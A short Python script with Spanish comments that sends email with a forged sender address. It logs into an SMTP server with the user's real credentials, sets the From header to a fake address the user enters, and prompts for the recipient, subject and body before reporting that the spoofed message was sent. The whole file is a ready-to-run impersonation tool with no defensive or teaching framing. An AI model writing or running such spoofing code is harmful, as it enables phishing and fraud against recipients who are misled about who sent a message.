import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def enviar_correo_spoofed(destinatario, asunto, cuerpo, remitente_falso,remitente_real,password,servidor):
    # Crear un objeto MIMEMultipart para el correo electrónico
    mensaje = MIMEMultipart()
    mensaje['From'] = remitente_falso  # Cambiar el remitente al remitente falso
    mensaje['To'] = destinatario
    mensaje['Subject'] = asunto
    mensaje.attach(MIMEText(cuerpo, 'plain'))

    # Iniciar la conexión SMTP
    servidor_smtp = smtplib.SMTP(servidor, 587)
    servidor_smtp.starttls()

    # Iniciar sesión en el servidor SMTP
    servidor_smtp.login(remitente_real, password)

    # Enviar el correo electrónico
    servidor_smtp.sendmail(remitente_real, destinatario, mensaje.as_string())

    # Cerrar la conexión SMTP
    servidor_smtp.quit()

# Ejemplo de uso
remitente_real = input("Correo electronico:")  # Tu dirección de correo electrónico real
password = input("Contraseña:")  # Tu contraseña de correo electrónico
servidor = input("Indica tu servidor SMTP:")
remitente_falso = input("Indica correo electronico remitente falso:")  # Dirección de correo electrónico falsa
destinatario = input("Indica destinatario:")  # Dirección de correo electrónico del destinatario
asunto = input("Asunto de correo:")
cuerpo = input("Texto:")


enviar_correo_spoofed(destinatario, asunto, cuerpo, remitente_falso,remitente_real,password,servidor)
print("Correo electrónico spoofed enviado exitosamente a", destinatario)
